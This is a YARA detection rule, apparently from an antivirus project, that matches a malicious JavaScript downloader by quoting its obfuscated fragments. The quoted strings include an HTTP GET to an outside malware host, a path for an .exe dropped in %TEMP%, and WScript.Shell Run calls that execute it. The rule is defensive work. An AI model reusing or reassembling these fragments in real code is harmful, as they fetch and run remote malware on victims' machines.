rule sig_20160328_b22e2c6669f0e522cb63c62487728627 {
  meta:
    description = "datamaliciousorder - file 20160328_b22e2c6669f0e522cb63c62487728627.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "a27dcfe867b169719550948cec38a210afad6ba4ef697ee56a259d691e5e5aaa"

  strings:
    $s1  = "Ogivawr[Sspyrujlfk](\"GET\", \"http://bombers-original.com/mdj6sf\", false);" fullword ascii
    $s2  = "function Gdizgvlxao() {return Xzplwv[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"GECTXmXwyMbetwlc.exe\";};" fullword ascii
    $s3  = "do {WScript[Fhjrm](Ymqjkgo() * 11)} while (Ogivawr[\"readystate\"] < 2 * 2);" fullword ascii
    $s4  = "function Qqhbnv(Zixttieky, Sewaifiatl){return Zixttieky - Sewaifiatl;};" fullword ascii
    $s5  = "var Xzplwv = function Lweagcavdp() {return WScript[Kbqjvrbs](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Lkxhgrftc() {return ((Zjlhvers == true) && (Zjlhvers == Orzvya)) ? 1 : Smmht;};" fullword ascii
    $s7  = "return Qqhbnv(Oawmtya, Jriyozrcx);" fullword ascii
    $s8  = "var Orzvya = false;" fullword ascii
    $s9  = "function Srkvbbgw(){return Qhszht;};" fullword ascii
    $s10 = "function Ymqjkgo(){return 22;};" fullword ascii
    $s11 = "var Xhzanbr = false;" fullword ascii
    $s12 = "function Hgodnvxjql(){return Kbqjvrbs;};" fullword ascii
    $s13 = "Zjlhvers = true; " fullword ascii
    $s14 = "Orzvya = true; " fullword ascii
    $s15 = " while (Lizpf){" fullword ascii
    $s16 = "function Ilmfwzakxq()" fullword ascii
    $s17 = "var Zjlhvers = false;" fullword ascii
    $s18 = "var Jxzguu = new this[\"Date\"]();" fullword ascii
    $s19 = "function Zjpblmoy(Nixfzjmy) {var Vavppfdcms = (1, 2, 3, 4, 5, Nixfzjmy); return Vavppfdcms;};" fullword ascii
    $s20 = "function Tmbslrcazt(Gwjoluq){Xzplwv[\"Run\"](Gwjoluq, Smmht, Smmht);};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}